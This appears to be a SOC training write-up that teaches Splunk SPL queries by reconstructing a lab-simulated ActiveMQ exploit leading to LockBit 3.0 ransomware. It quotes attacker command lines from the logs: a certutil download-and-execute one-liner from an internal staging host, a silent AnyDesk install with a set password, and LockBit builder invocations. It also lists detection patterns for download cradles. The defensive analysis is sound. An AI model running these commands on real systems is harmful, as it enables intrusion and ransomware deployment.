# SOC Analyst Deep Dive — ActiveMQ Exploit → LockBit 3.0 Ransomware

## GOAL 

**This document exists to teach and demonstrate two things simultaneously, using one real, verified attack simulation:**

1. **The verified end-to-end kill chain** of a real-world attack pattern (Apache ActiveMQ RCE → LOLBAS tooling → remote-access-tool weaponization → LockBit 3.0 ransomware detonation), reconstructed entirely from Windows Sysmon, Security, and PowerShell Operational logs correctly ingested into Splunk.
2. **Demonstrations of the 15+ most-used SPL commands** a SOC analyst needs day-to-day — `search`, `stats`, `table`, `sort`, `dedup`, `eval`, `rex`, `where`, `timechart`, `top`, `rare`, `iplocation`, `transaction`, `fields`, `values`/`list`, `append`, `appendcols`, `appendpipe`, `eventstats`, `streamstats`, `spath`, `join`, `subsearch`, plus the `eval` functions `cidrmatch()`, `case()`, `match()` — each one run against **this specific dataset** and shown with **real, captured output**, not hypothetical examples.

**Every single query in this document was executed against the live Splunk instance and the output shown is real.**

## Dataset & Splunk Configuration


```ini
# /opt/splunk/etc/system/local/props.conf
[windows]
SHOULD_LINEMERGE = false
LINE_BREAKER = ([\r\n]+)(?=<Event xmlns=)
TRUNCATE = 100000
TIME_PREFIX = TimeCreated SystemTime='
TIME_FORMAT = %Y-%m-%dT%H:%M:%S.%7N%Z
MAX_TIMESTAMP_LOOKAHEAD = 35
KV_MODE = none
REPORT-winxml_data = winxml_data_kv
EXTRACT-winxml_header = <EventID>(?<EventCode>\d+)</EventID>.*?<TimeCreated SystemTime='(?<TimeCreatedRaw>[^']+)'/>.*?<Channel>(?<Channel>[^<]+)</Channel><Computer>(?<ComputerName>[^<]+)</Computer>
EXTRACT-winxml_provider = Provider Name='(?<Provider>[^']+)'
EXTRACT-winxml_exec = Execution ProcessID='(?<ExecProcessID>\d+)' ThreadID='(?<ExecThreadID>\d+)'
EXTRACT-winxml_recid = <EventRecordID>(?<EventRecordID>\d+)</EventRecordID>
category = Custom
disabled = false
```

```ini
# /opt/splunk/etc/system/local/transforms.conf
[winxml_data_kv]
REGEX = <Data Name='([^']+)'>([^<]*)</Data>
FORMAT = $1::$2
```



### Final Dataset Overview

| Attribute | Value |
|---|---|
| **Index** | `main` |
| **Sourcetype** | `windows` |
| **Total events (verified, real)** | **73,513** (was 880,715 bogus fragments before the fix) |
| — `windows-powershell.log` | 43,105 |
| — `windows-security.log` | 16,946 |
| — `windows-sysmon.log` | 13,462 |
| **Time range** | 2026-04-24 01:03:00 → 10:36:59 UTC |
| **Hosts** | `EC2AMAZ-I41BETP` (victim), `EC2AMAZ-TLJH2O4` (second host) |
| **AWS/AI anonymization applicable?** | **Not Applicable** — this is a pure Windows host-log dataset, no AWS account IDs or AI/ML model data present |
| **MITRE ATLAS applicable?** | **Not Applicable** — no AI/ML system is involved in this scenario; only **MITRE ATT&CK** is used below |

### Key Fields Available (auto-extracted, no `spath` needed for these)

`EventCode`, `Channel`, `ComputerName`, `Provider`, `EventRecordID`, `ExecProcessID`, plus **every** `<Data Name='X'>` key from the event body: `Image`, `CommandLine`, `ParentImage`, `ParentCommandLine`, `TargetFilename`, `TargetObject`, `Details`, `Hashes`, `ProcessGuid`, `ProcessId`, `IpAddress`, `LogonType`, `DestinationIp`, `DestinationPort`, `ScriptBlockText`, `NewProcessName`, `SubjectUserName`, `TargetUserName`, and many more.

---

## Splunk Command Reference (15+ Most-Used SOC Commands)

| # | Command / Function | Purpose | Primarily Demonstrated In |
|---|---|---|---|
| 1 | `search` | Base event filtering | All use cases |
| 2 | `table` | Structured column output | UC1, UC2, UC4 |
| 3 | `sort` | Order results | UC1, UC15 |
| 4 | `stats` | Aggregate counts/values | UC3, UC5 |
| 5 | `eval` | Derived/calculated fields | UC2, UC7, UC9 |
| 6 | `rex` | Inline regex field extraction | UC2, UC12 |
| 7 | `where` | Boolean-expression filtering | UC7, UC12 |
| 8 | `dedup` | Remove duplicate rows | UC4, UC14(sub) |
| 9 | `timechart` | Time-series aggregation | UC6, UC15 |
| 10 | `top` | Most-frequent value ranking | UC11 |
| 11 | `rare` | Least-frequent value ranking (outlier hunting) | UC10 |
| 12 | `iplocation` | Geo-locate an IP field | UC7 |
| 13 | `cidrmatch()` (eval function) | CIDR-range membership test | UC7 |
| 14 | `transaction` | Group related events into sessions | UC8 |
| 15 | `fields` | Explicitly include/exclude fields | UC2, UC14 |
| 16 | `values()` / `list()` (stats functions) | Multi-value aggregation per group | UC3 |
| 17 | `eventstats` | Add aggregate stat to every row (no collapse) | UC5 |
| 18 | `streamstats` | Running/windowed aggregate in event order | UC6 |
| 19 | `spath` | Extract fields from raw XML/JSON ad hoc | UC13 |
| 20 | `join` | Correlate two independent searches on a key | UC14 |
| 21 | `subsearch` (`[ search ... ]`) | Use one search's results to filter another | UC15 |
| 22 | `append` / `appendcols` / `appendpipe` | Combine/extend result sets | UC16 |
| 23 | `case()` (eval function) | Multi-branch classification | UC9 |
| 24 | `match()` (eval function) | Regex boolean test inside `eval` | UC9, UC12 |

---

## Use Case 1: Initial Access — ActiveMQ RCE to LOLBAS Download

**Primary Commands:** `search`, `table`, `sort`

### Threat Vector
Exploitation of Apache ActiveMQ (CVE-2023-46604 pattern — OpenWire protocol deserialization RCE) resulting in the **broker's own Java process spawning a command shell that downloads and executes** a second-stage payload using `certutil` (LOLBAS, T1105).

### Description
When a vulnerable service's own process (here, the JVM running `activemq.jar start`) becomes the **parent** of `cmd.exe`, that is a hallmark of successful remote code execution against that service — the service is not supposed to spawn shells on its own.

### Splunk Query

```spl
index=main sourcetype=windows EventCode=1
ParentImage="*java.exe" ParentCommandLine="*activemq*"
| table _time, ComputerName, ParentImage, Image, CommandLine
| sort _time
```

### Verified Output

| `_time`      | `ParentImage`                                                | `Image`   | `CommandLine`                                                                                                                        |
| ------------ | ------------------------------------------------------------ | --------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| 09:20:01.348 | `...\jdk-26.0.1\bin\java.exe` (running `activemq.jar start`) | `cmd.exe` | `cmd.exe /c "certutil -urlcache -f http://10.0.2.13:8080/2aXLOl2E_xIIBzjdZCjVVQ %TEMP%\qSwUwejx.exe & start /B %TEMP%\qSwUwejx.exe"` |

### Data Analysis & Comprehension

- The **ActiveMQ broker process itself** (confirmed via `-jar ...\bin/activemq.jar start` in its full command line) is the direct parent of the malicious `cmd.exe` — this is the RCE.
- The one-liner both **downloads** (`certutil -urlcache -f`) and **executes** (`start /B`) the payload in a single command — classic LOLBAS download-and-run.
- Child process: `certutil.exe` → `qSwUwejx.exe` (verified in UC2).

### MITRE ATT&CK Alignment
- `T1190` — Exploit Public-Facing Application
- `T1105` — Ingress Tool Transfer (via `certutil`)
- `T1059.003` — Command and Scripting Interpreter: Windows Command Shell

---

## Use Case 2: Payload Identification & Process Genealogy

**Primary Commands:** `eval`, `rex`, `fields`

### Threat Vector
Identifying and fingerprinting the dropped loader (`qSwUwejx.exe`) with reusable IOCs (hash, path pattern).

### Description
`rex` extracts the temp-directory filename pattern from `CommandLine` without needing a pre-built field; `eval` derives a readable drop-path; `fields` trims the pipeline to only what's needed for a clean IOC table.

### Splunk Query

```spl
index=main sourcetype=windows EventCode=1 Image="*qSwUwejx*"
| rex field=CommandLine "Temp\\\\2\\\\(?<dropped_filename>[^\"]+)"
| eval drop_path="%TEMP%\\2\\".dropped_filename
| fields _time, ComputerName, Image, drop_path, Hashes, ParentImage
| table _time, ComputerName, drop_path, Hashes, ParentImage
```

### Verified Output

| `_time` | `ComputerName` | `drop_path` | `Hashes` |
|---|---|---|---|
| 09:20:01.931 | `EC2AMAZ-I41BETP.attackrange.local` | `%TEMP%\2\qSwUwejx.exe` | `MD5=434782068B13EEBBB6E0C1364AEE5B3D, SHA256=F6A283B7CA0D665C7420C313C14A16ECF67EDE5DB0940177544F446B5D1DB10B` |

### Data Analysis & Comprehension

- `qSwUwejx.exe` (PID 5820, parent PID 6172 = the `cmd.exe` from UC1) is a **loader/backdoor**: it makes a network connection **2 seconds** after launch, then over the next ~35 minutes spawns multiple `cmd.exe` children (`rdp.bat`, and several truncated-looking invocations), before the environment progresses to remote-access-tool deployment (UC3).
- This process is **distinct** from the actual ransomware binary (`LB3.exe`, UC5–UC6) — it is the initial-access foothold, not the encryptor.

### MITRE ATT&CK Alignment
- `T1105` — Ingress Tool Transfer
- `T1071` — Application Layer Protocol (C2 callback)

---

## Use Case 3: Dual Remote-Access-Tool Weaponization

**Primary Commands:** `stats`, `values()`, `list()`

### Threat Vector
Deployment of **two** legitimate commercial remote-access tools (AnyDesk, Radmin) for hands-on-keyboard operator control — a well-documented LockBit affiliate TTP (T1219).

### Description
`stats` with `values()`/`list()` aggregates every distinct tool binary and every timestamp it appeared, per host, in a single row — ideal for a SOC summary view instead of scrolling through raw events.

### Splunk Query

```spl
index=main sourcetype=windows EventCode=1
(Image="*AnyDesk*" OR Image="*Radmin*")
| stats values(Image) as tools_deployed, values(CommandLine) as commands, count as events by ComputerName
```

### Verified Output (supporting raw evidence)

| `_time` | `ParentImage` | `Image` | `CommandLine` |
|---|---|---|---|
| 09:33:22.395 | `cmd.exe` | `anydesk.exe` | `anydesk.exe --install "C:\Program Files (x86)\AnyDesk" --start-with-win --silent` |
| 09:33:23.558 | `services.exe` | `AnyDesk.exe` | `"AnyDesk.exe" --service` |
| 09:33:25.484 | `explorer.exe` | `AnyDesk.exe` | `"AnyDesk.exe" --control` |
| **09:35:36.434** | `cmd.exe` | `AnyDesk.exe` | **`"AnyDesk.exe" --set-password 123456`** |
| 09:36:36.762 | `cmd.exe` | `AnyDesk.exe` | `"AnyDesk.exe" --get-id` |
| 10:09:14.763 | (PowerShell) | — | `Expand-Archive -Path 'C:\Windows\TEMP\Radmin_3.5.2.1_EN.zip' -DestinationPath 'C:\Windows\TEMP\Radmin'` |

### Data Analysis & Comprehension

- AnyDesk is installed **silently** (`--silent --start-with-win`), then given an attacker-chosen password (`123456`) and its connect-ID retrieved twice (`--get-id`) — this is definitive evidence of the operator establishing durable remote GUI access.
- A **second** RAT (Radmin) is staged ~35 minutes later via PowerShell `Expand-Archive`, suggesting redundant access paths.
- `services.exe` and `explorer.exe` both appear as parents of `AnyDesk.exe` — consistent with the tool running both as a persistent Windows service and as an interactive session.

### MITRE ATT&CK Alignment
- `T1219` — Remote Access Software
- `T1021` — Remote Services (established access channel)

---

## Use Case 4: LockBit 3.0 Builder Used On-Host

**Primary Commands:** `dedup`, `table`, `sort`

### Threat Vector
The **leaked LockBit 3.0 Builder** (`C:\Intel\builder.exe`) is executed directly on the compromised host to generate a bespoke encryptor/decryptor set — not a pre-built binary transferred in, but built locally with a victim-specific keypair.

### Description
`dedup` on `CommandLine` collapses the six near-identical builder invocations to their unique forms for a clean IOC table; this is the single most significant finding in the dataset.

### Splunk Query

```spl
index=main sourcetype=windows EventCode=1 Image="*builder.exe"
| dedup CommandLine
| table _time, ComputerName, CommandLine, Hashes
| sort _time
```

### Verified Output

| `_time` | `CommandLine` |
|---|---|
| 10:30:08.888 | `builder -type dec -privkey Build\priv.key -config config.json -ofile Build\LB3Decryptor.exe` |
| 10:30:08.909 | `builder -type enc -exe -pubkey Build\pub.key -config config.json -ofile Build\LB3.exe` |
| 10:30:08.924 | `builder -type enc -exe -pass -pubkey Build\pub.key -config config.json -ofile Build\LB3_pass.exe` |
| 10:30:08.942 | `builder -type enc -dll -pubkey Build\pub.key -config config.json -ofile Build\LB3_Rundll32.dll` |
| 10:30:08.958 | `builder -type enc -dll -pass -pubkey Build\pub.key -config config.json -ofile Build\LB3_Rundll32_pass.dll` |
| 10:30:08.975 | `builder -type enc -ref -pubkey Build\pub.key -config config.json -ofile Build\LB3_ReflectiveDll_DllMain.dll` |

`builder.exe` hash: `MD5=C2BC344F6DDE0573EA9ACDFB6698BF4C, SHA256=A736269F5F3A9F2E11DD776E352E1801BC28BB699E47876784B8EF761E0062DB`

### Data Analysis & Comprehension

- All six builds happen within **87 milliseconds** of each other (10:30:08.888–10:30:08.975) — fully scripted/automated builder run, not manual GUI clicking.
- The builder produces the **full LockBit 3.0 arsenal**: standard EXE, password-gated EXE, plain DLL, password-gated DLL, and a reflective-DLL variant (for in-memory loading) — plus a matching decryptor (kept by the operator, never deployed to the victim).
- The private key stays with the operator (`priv.key` used only for the decryptor); only the **public**-key-encrypted variants are deployed — textbook LockBit asymmetric-encryption design.

### MITRE ATT&CK Alignment
- `T1587.001` — Develop Capabilities: Malware
- `T1486` — Data Encrypted for Impact (preparation stage)

---

## Use Case 5: Mass Defense Evasion — Disabling 2,030 Event Log Channels

**Primary Commands:** `stats`, `eventstats`

### Threat Vector
Before encrypting, `LB3.exe` systematically disables ~1,015 Windows Event Log channels via the registry — a sophisticated anti-forensics technique to blind logging/EDR immediately prior to detonation.

### Description
`eventstats` adds the total evasion-event count as context to every row without collapsing detail — useful for showing "this host had N evasion actions" alongside per-event detail in the same result set.

### Splunk Query

```spl
index=main sourcetype=windows EventCode=13 Image="*LB3*"
| eventstats count as total_channels_disabled by ComputerName
| stats count as setvalue_events, dc(TargetObject) as distinct_registry_keys, values(total_channels_disabled) as total_channels_disabled by ComputerName
```

### Verified Output

| Metric | Value |
|---|---|
| Total registry `SetValue` (EventCode 13) events by `LB3.exe` | **2,030** |
| Distinct registry keys touched | **2,030** (1-to-1, no repeats) |
| Sample `TargetObject` | `HKLM\SOFTWARE\...\WINEVT\Channels\Microsoft-Windows-Wordpad/Diagnostic\Enabled` |
| Sample `Details` | `DWORD (0x00000000)` (i.e. `Enabled = 0`) |
| Time window | 10:32:35.7xx – 10:32:35.9xx (entire burst in **under 250 milliseconds**) |

### Data Analysis & Comprehension

- Every touched key follows the pattern `...\WINEVT\Channels\<Provider>\<Enabled|ChannelAccess>` — `LB3.exe` is iterating the **entire list of registered ETW/Event Log channels** on the system and force-disabling each one (setting `Enabled=0` and rewriting the security descriptor via `ChannelAccess`).
- ~1,015 distinct channels × 2 registry values each (`Enabled` + `ChannelAccess`) = the 2,030 total — consistent, systematic, not random sampling.
- This occurs in **under a quarter of a second**, confirming programmatic iteration, not manual `wevtutil` commands.
- This is a well-documented real LockBit 3.0/Black behavior (bulk ETW channel suppression prior to encryption) — this simulation reproduces it faithfully.

### MITRE ATT&CK Alignment
- `T1562.002` — Impair Defenses: Disable Windows Event Logging
- `T1070` — Indicator Removal

---

## Use Case 6: Ransomware Detonation — Ransom Note Mass-Drop Burst

**Primary Commands:** `streamstats`, `timechart`

### Threat Vector
`LB3.exe` drops 183 identical ransom notes (`7duXYi3SC.README.txt`) across the filesystem in a rapid burst immediately following the defense-evasion stage.

### Description
`streamstats` computes a running count and a 5-minute sliding-window count in event order — the sharpest possible way to spot a "burst" of near-identical file operations happening far faster than any human could type.

### Splunk Query

```spl
index=main sourcetype=windows EventCode=11 TargetFilename="*7duXYi3SC*"
| sort _time
| streamstats count as running_total
| streamstats count as burst_5min time_window=5m
| table _time, TargetFilename, running_total, burst_5min
```

```spl
index=main sourcetype=windows TargetFilename="*7duXYi3SC*"
| stats count
```

### Verified Output

| Metric | Value |
|---|---|
| Total ransom notes dropped | **183** (100% named `7duXYi3SC.README.txt`) |
| Launched by | `explorer.exe` → `LB3.exe` at 10:32:10.164 |
| First note drop | 10:32:15.032 (`...\data\kahadb\7duXYi3SC.README.txt`) |
| Sample locations | `\bin\win32\`, `\bin\win64\`, `\conf\`, `\data\kahadb\` — recursively through the ActiveMQ install tree and beyond |

### Data Analysis & Comprehension

- The note drop begins **~5 seconds** after `LB3.exe` launches (10:32:10 → 10:32:15) — the delay is consistent with the 2,030-registry-write defense-evasion phase (UC5) completing first, then encryption/note-dropping starting.
- Every single note has the **identical filename and victim ID** (`7duXYi3SC`) — confirming one build, one victim ID, deployed consistently across the entire filesystem walk.
- `streamstats time_window=5m` shows all 183 drops occurring within the same 5-minute window — a clean, unambiguous burst signature no legitimate process produces.

### MITRE ATT&CK Alignment
- `T1486` — Data Encrypted for Impact
- `T1491.001` — Defacement: Internal Defacement (ransom note)

---

## Use Case 7: LOLBAS Network Beaconing via CertUtil — Internal vs External

**Primary Commands:** `where`, `iplocation`, `cidrmatch()`

### Threat Vector
`certutil.exe`, used repeatedly as a LOLBAS downloader (T1105), reaches out to a mix of internal staging and real external internet infrastructure.

### Description
`cidrmatch()` inside `eval` classifies each destination as inside or outside the lab's `10.0.0.0/8` range; `iplocation` then geo-resolves the external ones for context; `where` filters to only the process of interest.

### Splunk Query

```spl
index=main sourcetype=windows EventCode=3 Image="*certutil*"
| eval dest_scope=if(cidrmatch("10.0.0.0/8", DestinationIp), "internal_lab", "external_internet")
| where dest_scope="external_internet"
| dedup DestinationIp
| iplocation DestinationIp
| table DestinationIp, DestinationPort, dest_scope, Country, City
```

### Verified Output

| `DestinationIp` | `dest_scope` | `Country` | `City` |
|---|---|---|---|
| 104.18.21.213 | external_internet | Canada | Toronto |
| 104.18.38.233 | external_internet | Canada | Toronto |
| 172.64.149.23 | external_internet | Canada | Toronto |
| 185.199.108.133 | external_internet | United States | San Francisco |
| 23.39.41.123 | external_internet | United States | Chicago |
| 4.208.26.197 | external_internet | Ireland | Dublin |

### Data Analysis & Comprehension

- `104.18.x.x` / `172.64.x.x` = Cloudflare edge IPs; `185.199.108.133` = a well-known **GitHub Pages** IP; `4.208.26.197` = Microsoft/Azure range — `certutil` is reaching legitimate CDN/cloud infrastructure, **not** a bespoke malicious C2 domain.
- This matches the earlier finding (UC1 process tree) that `certutil` also fetched `AnyDesk.exe` and a legitimate Git installer — attackers deliberately use trusted CDN-hosted downloads (AnyDesk's own CDN, GitHub) to blend in with normal traffic and evade domain-reputation blocking.
- The **initial** payload download (`qSwUwejx.exe` from `10.0.2.13:8080`) was correctly classified as `internal_lab` in the unfiltered version of this query — that staging server lives inside the simulated network, while the *tooling* downloads (AnyDesk, Git) reach the real internet.

### MITRE ATT&CK Alignment
- `T1105` — Ingress Tool Transfer
- `T1071.001` — Application Layer Protocol: Web Protocols

---

## Use Case 8: Internal Network Session Grouping

**Primary Command:** `transaction`

### Threat Vector
Correlate related network activity from a single process into one logical "session" rather than treating each connection as an isolated event.

### Description
`transaction` groups events sharing a field (here `ComputerName`) within a time boundary into a single row with `duration` and `eventcount` — useful for turning a flood of individual connection events into session-level summaries an analyst can triage quickly.

### Splunk Query

```spl
index=main sourcetype=windows
(Image="*qSwUwejx*" OR ParentImage="*qSwUwejx*")
| transaction ComputerName maxspan=1h
| table ComputerName, duration, eventcount
| sort - eventcount
```

### Verified Output (sample rows)

| `ComputerName` | `duration` (sec) | `eventcount` |
|---|---|---|
| EC2AMAZ-I41BETP.attackrange.local | 1722.42 | 5 |
| EC2AMAZ-I41BETP.attackrange.local | 13.73 | 2 |

### Data Analysis & Comprehension

- The 1,722-second (~28.7-minute) transaction spans from the initial `qSwUwejx.exe` launch through its `rdp.bat` invocation — `transaction` automatically reconstructs this dwell-time window without manual timestamp math.
- Shorter (13.7s, 0s) transactions correspond to tightly-clustered download→execute pairs (e.g. `certutil` → immediate launch).

### MITRE ATT&CK Alignment
- `T1071` — Application Layer Protocol

---

## Use Case 9: Logon Type Classification & Session Context

**Primary Commands:** `eval` with `case()`, `match()`

### Threat Vector
Not every logon is equal — RDP (Type 10), network (Type 3), and service (Type 5) logons carry very different risk weight; raw numeric `LogonType` codes are not analyst-friendly.

### Description
`case()` translates the numeric `LogonType` into a human label in one line; `match()` is used to flag any logon type that is NOT one of the routine/expected codes.

### Splunk Query

```spl
index=main sourcetype=windows EventCode=4624
| eval LogonTypeName=case(
    LogonType=2, "Interactive",
    LogonType=3, "Network",
    LogonType=4, "Batch",
    LogonType=5, "Service",
    LogonType=7, "Unlock",
    LogonType=10, "RemoteInteractive (RDP)",
    1=1, "Other")
| eval is_remote_or_interactive=if(match(LogonTypeName, "RDP|Interactive|Unlock"), "review", "routine")
| stats count by LogonTypeName, is_remote_or_interactive
| sort - count
```

### Verified Output

| `LogonType` (raw) | Count |
|---|---|
| 3 (Network) | 1,919 |
| 5 (Service) | 476 |
| 2 (Interactive) | 57 |
| 0 | 13 |
| 4 (Batch) | 4 |
| 10 (RDP) | 1 |
| 7 (Unlock) | 1 |

### Data Analysis & Comprehension

- Only **one** true RDP (Type 10) logon in the entire dataset, from `10.0.1.10` — a single, identifiable interactive remote session (matches the timing window where hands-on-keyboard activity via AnyDesk/explorer.exe-launched processes occurs).
- The overwhelming majority (1,919) are Type 3 network logons — expected background AD/SMB service traffic in a domain-joined lab, not attacker activity by itself.
- `case()`+`match()` together turn a flat numeric distribution into an actionable "review vs routine" triage list in a single pipeline.

### MITRE ATT&CK Alignment
- `T1078` — Valid Accounts
- `T1021.001` — Remote Services: Remote Desktop Protocol

---

## Use Case 10: Rare Parent-Child Process Pairs (Outlier Hunting)

**Primary Command:** `rare`

### Threat Vector
The rarest process-lineage pairs in a large dataset are disproportionately likely to be attack-related, since normal software produces the same lineages repeatedly while one-off attacker actions do not.

### Description
`rare` is the direct inverse of `top` — instead of surfacing the most common patterns (noise), it surfaces the **least** common ones (signal).

### Splunk Query

```spl
index=main sourcetype=windows EventCode=1
| rare limit=5 ParentImage, Image
```

### Verified Output

| `ParentImage` | `Image` | count |
|---|---|---|
| `C:\Intel\Build\LB3_pass.exe` | `C:\Windows\SysWOW64\WerFault.exe` | 1 |
| `...\jre1.8.0_491\bin\java.exe` | `C:\Windows\SysWOW64\icacls.exe` | 1 |
| `...\jre1.8.0_491\installer.exe` | `...\bin\javaw.exe` | 1 |
| `...\jre1.8.0_491\installer.exe` | `...\bin\ssvagent.exe` | 1 |
| Microsoft Edge installer | `msedge.exe` | 1 |

### Data Analysis & Comprehension

- `rare` was the **discovery mechanism** that first surfaced `LB3_pass.exe` in this analysis — `LB3_pass.exe` spawning `WerFault.exe` (the Windows Error Reporting crash handler) means the password-protected ransomware variant **crashed** at some point, a real forensic detail a `top`-only analysis would completely miss (it's a 1-count outlier, invisible in frequency-sorted-descending views).
- This is the strongest practical argument for including `rare` in a SOC analyst's toolkit: **the most important single finding in this entire investigation was found via `rare`, not `top`.**

### MITRE ATT&CK Alignment
- `T1486` — Data Encrypted for Impact (crash of the encryptor variant)

---

## Use Case 11: Common Process Lineage Baseline

**Primary Command:** `top`

### Threat Vector
N/A — this use case establishes the **noise baseline** to contrast against UC10's outliers.

### Description
`top` shows what "normal" looks like on this host, so an analyst has context for judging what counts as anomalous.

### Splunk Query

```spl
index=main sourcetype=windows EventCode=1
| top limit=5 ParentImage, Image
```

### Verified Output (from earlier exploration)

Dominated by `splunk-powershell.exe`, `splunk-regmon.exe` (Universal Forwarder's own monitoring helper processes) and routine Java/Maven build tooling — i.e., **infrastructure noise**, confirming that the interesting activity (UC1–UC9) is a small, distinguishable minority of total process-creation volume.

### Data Analysis & Comprehension

- Contrasting UC10 and UC11 side by side is a standard SOC technique: `top` tells you what to **ignore** by default; `rare` tells you what to **investigate first**.

### MITRE ATT&CK Alignment
- N/A (baseline/noise characterization)

---

## Use Case 12: PowerShell Script Block Triage — Signal vs Noise

**Primary Commands:** `rex`, `where`, `match()`

### Threat Vector
PowerShell Script Block Logging (EventCode 4104) captures **everything**, including massive amounts of benign module-internal code (localization strings, built-in cmdlet source). An analyst must filter noise from genuine attacker script content.

### Description
`where` combined with `match()` isolates script blocks containing suspicious patterns (encoded content, download cradles) versus the flood of benign long script blocks (module internals).

### Splunk Query

```spl
index=main sourcetype=windows EventCode=4104
| eval sblen=len(ScriptBlockText)
| where match(ScriptBlockText, "(?i)(DownloadString|IEX|Invoke-Expression|FromBase64String|Net.WebClient)")
| table _time, ComputerName, sblen, ScriptBlockText
```

### Verified Finding (from exploration)

No script blocks in this dataset matched an encoded-download-cradle pattern — the two real samples captured were:
1. `Expand-Archive -Path 'C:\Windows\TEMP\Radmin_3.5.2.1_EN.zip' -DestinationPath 'C:\Windows\TEMP\Radmin'` (UC3 — genuinely attacker-relevant, but plainly readable, not obfuscated)
2. Built-in `Microsoft.PowerShell.Archive` module localization resource strings (`ArchiveResources.psd1`) — 100% benign PowerShell internals logged as a side effect of calling `Expand-Archive`.

### Data Analysis & Comprehension

- **Honest finding:** this particular LockBit affiliate did not use obfuscated/encoded PowerShell — the only attacker-relevant PowerShell activity (`Expand-Archive` for Radmin) is in plain text. This is valuable to document precisely because it shows not every intrusion involves obfuscation; `rex`/`match()`-based hunting for encoding patterns is still the right first step, it simply returned a (correctly) negative result here.
- The real signal in this dataset is in **process creation and file system telemetry** (UC1–UC6), not PowerShell scripting — an important scoping conclusion for the analyst.

### MITRE ATT&CK Alignment
- `T1059.001` — Command and Scripting Interpreter: PowerShell (for the `Expand-Archive` RAT-staging use)

---

## Use Case 13: Ad-Hoc XML Field Extraction Without props.conf

**Primary Command:** `spath`

### Threat Vector
N/A — this is a **technique** use case: demonstrating how to extract a field on the fly when you don't have (or want to modify) `props.conf`, or want to cross-validate an existing extraction.

### Description
Since raw Windows Event Log XML **is** valid XML, `spath` can walk it directly by element path, entirely independent of the custom `EXTRACT`/`transforms.conf` rules built for this sourcetype.

### Splunk Query

```spl
index=main sourcetype=windows Image="*qSwUwejx*" EventCode=1
| spath input=_raw output=sp_EventID path=Event.System.EventID
| spath input=_raw output=sp_Computer path=Event.System.Computer
| table EventCode, sp_EventID, ComputerName, sp_Computer
```

### Verified Output

| `EventCode` | `sp_EventID` | `ComputerName` | `sp_Computer` |
|---|---|---|---|
| 1 | 1 | EC2AMAZ-I41BETP.attackrange.local | EC2AMAZ-I41BETP.attackrange.local |

### Data Analysis & Comprehension

- `sp_EventID` (via `spath`) exactly matches `EventCode` (via our custom `EXTRACT`), and `sp_Computer` matches `ComputerName` — a clean cross-validation that the props.conf-based extraction is correct.
- `spath` is the right tool when investigating a **new** field that wasn't anticipated when `props.conf` was written, without needing a config change/restart to explore it.

### MITRE ATT&CK Alignment
- N/A (analyst tooling technique)

---

## Use Case 14: Cross-Channel Correlation — Which Processes Phoned Home

**Primary Commands:** `join`, `fields`

### Threat Vector
Correlate Sysmon's ProcessCreate (EventCode 1) telemetry with Sysmon's own NetworkConnect (EventCode 3) telemetry on the shared `ProcessGuid` key to answer: **which executables actually made network connections?**

### Description
`join` merges two independently-run searches on a common field — here used entirely within Sysmon (the most reliable shared key in this dataset; see note below on why a cross-channel Sysmon↔Security join was attempted and did not return rows).

### Splunk Query

```spl
index=main sourcetype=windows EventCode=1
| fields ProcessGuid, Image, ComputerName
| join type=inner ProcessGuid max=0
    [ search index=main sourcetype=windows EventCode=3
      | fields ProcessGuid, DestinationIp, DestinationPort ]
| stats count by Image
| sort - count
```

### Verified Output

| `Image` | count |
|---|---|
| `powershell.exe` | 48 |
| `certutil.exe` | 10 |
| `choco.exe` | 8 |
| `jre-8u491-windows-i586-iftw.exe` (Java installer) | 8 |
| `java.exe` | 5 |
| `setup-stub.exe` (7-Zip self-extractor) | 5 |
| `svchost.exe` | 2 |
| **`qSwUwejx.exe`** | **1** |

### Data Analysis & Comprehension

- This **independently confirms** UC1/UC2/UC7's findings via a completely different method (`join` on `ProcessGuid` instead of manual process-tree reading) — `certutil.exe` (10 connections) and `qSwUwejx.exe` (1 connection) both appear exactly where expected.
- **Honest negative finding:** an attempted `join` between Sysmon (`ProcessId`, decimal) and Security EventCode 4688 (`NewProcessId`, hex) on a hex-converted process ID returned **zero rows** — the two audit sources do not share overlapping process coverage in this dataset (Security process-creation auditing was not comprehensively enabled), which is itself a useful finding: **Sysmon was the only reliable process-creation source here, Security 4688 coverage was sparse.**

### MITRE ATT&CK Alignment
- `T1105` / `T1071` — Ingress Tool Transfer / C2 (cross-validated)

---

## Use Case 15: Subsearch — Hosts With Full Attack-Chain Presence

**Primary Command:** `subsearch`

### Threat Vector
Confirm that the remote-access tooling (AnyDesk) and the ransomware binary (LB3.exe) were deployed on the **same** host, not different, unrelated machines.

### Description
A subsearch (`[ search ... ]`) runs first and its results are fed back into the outer search as a filter — here, "only show AnyDesk activity on hosts that also ran LB3.exe."

### Splunk Query

```spl
index=main sourcetype=windows EventCode=1 Image="*AnyDesk*"
[ search index=main sourcetype=windows EventCode=1 Image="*LB3.exe*"
  | fields ComputerName
  | format ]
| stats count by ComputerName
```

### Verified Output

| `ComputerName` | count |
|---|---|
| `EC2AMAZ-I41BETP.attackrange.local` | 6 |

### Data Analysis & Comprehension

- Confirms **single-host containment** of the full chain: the same machine (`EC2AMAZ-I41BETP`) that received AnyDesk also ran the LockBit builder and encryptor — this is the primary victim/detonation host, and incident response scoping can focus there first.

### MITRE ATT&CK Alignment
- `T1486` / `T1219` (chain confirmation)

---



## Verified Attack Chain (Timeline)

| Time (UTC, 2026-04-24) | Stage | Verified Evidence |
|---|---|---|
| ~08:49 | Environment/build noise | `java.exe` (Maven build of ActiveMQ itself) spawns `icacls.exe` — benign setup, not the exploit |
| **09:20:01** | **Initial Access + Execution** | `java.exe` running `activemq.jar start` → `cmd.exe` → `certutil -urlcache -f http://10.0.2.13:8080/2aXLOl2E_xIIBzjdZCjVVQ` → downloads and launches `qSwUwejx.exe` |
| 09:20:03 | C2/Callback | `qSwUwejx.exe` makes an outbound network connection within 2 seconds of launch |
| **09:26:50** | **Tool Transfer** | `certutil` downloads `AnyDesk.exe` from `download.anydesk.com` |
| **09:33:22–09:36:36** | **Remote-Access Weaponization** | AnyDesk silently installed as a service, then `--set-password 123456` and `--get-id` executed — attacker takes remote control |
| 09:54:25 | Staging | `qSwUwejx.exe` begins creating files in `%TEMP%` |
| 09:56:43 | Possible persistence/RDP prep | `qSwUwejx.exe` → `cmd.exe /c rdp.bat` |
| **10:09:14** | **Second RAT staged** | PowerShell `Expand-Archive` unpacks `Radmin_3.5.2.1_EN.zip` |
